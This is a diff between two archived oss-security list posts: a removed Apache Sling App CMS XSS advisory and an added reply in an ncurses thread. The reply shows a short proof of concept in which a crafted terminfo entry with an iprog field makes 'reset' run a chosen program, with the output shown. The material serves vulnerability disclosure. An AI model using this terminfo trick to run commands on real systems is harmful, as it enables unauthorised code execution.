@@ -1,27 +1,35 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/02/04/1
-Message-ID: <b96f4001-bed6-9594-c844-1766b8c8cefc@apache.org>
-Date: Fri, 03 Feb 2023 23:38:07 +0000
-From: Dan Klco <dklco@...che.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/04/14/1
+Message-ID: <u1c9tb$5m4$1@ciao.gmane.io>
+Date: Fri, 14 Apr 2023 19:35:07 -0000 (UTC)
+From: Tavis Ormandy <taviso@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE-2023-22849: Apache Sling App CMS: XSS in CMS Reference / UI Components 
+Subject: Re: ncurses fixes upstream
 Content-Type: text/plain; charset=utf-8
 
-Severity: low
+On 2023-04-13, Mark Esler wrote:
+> When you publish the CVE json5, you can references the patch URL and 
+> relevant bug discussions to help downstream. Including the CVE number in 
+> the patch commit is also quite helpful.
+>
+> Thank you!
+>
+>> We've reached out to Arch, RedHat, Canonical and other popular distros independently.
 
-Description:
+I'm curious what the attack is! ISTR that terminfo definitions can
+contain shell commands by design and so are generally considered
+trusted.
 
-An improper neutralization of input during web page generation ('Cross-site Scripting') [CWE-79] vulnerability in Sling App CMS version 1.1.4 and prior may allow an authenticated remote attacker to perform a reflected cross-site scripting (XSS) attack in multiple features.
+I remember using this trick in an exploit once :)
 
-Upgrade to Apache Sling App CMS >= 1.1.6
+$ printf "exploit, iprog=/usr/bin/id,\n" | tic -
+$ TERM=exploit reset
+uid=1000(taviso) gid=1000(taviso)
 
-Credit:
+Tavis.
 
-Apache Sling would like to thank Eugene Lim and Sng Jay Kai from GOVTECH for reporting this issue (finder)
-
-References:
-
-https://sling.apache.org/news.html
-https://sling.apache.org/
-https://www.cve.org/CVERecord?id=CVE-2023-22849
+-- 
+ _o)            $ lynx lock.cmpxchg8b.com
+ /\\  _o)  _o)  $ finger taviso@....org
+_\_V _( ) _( )  @taviso
 
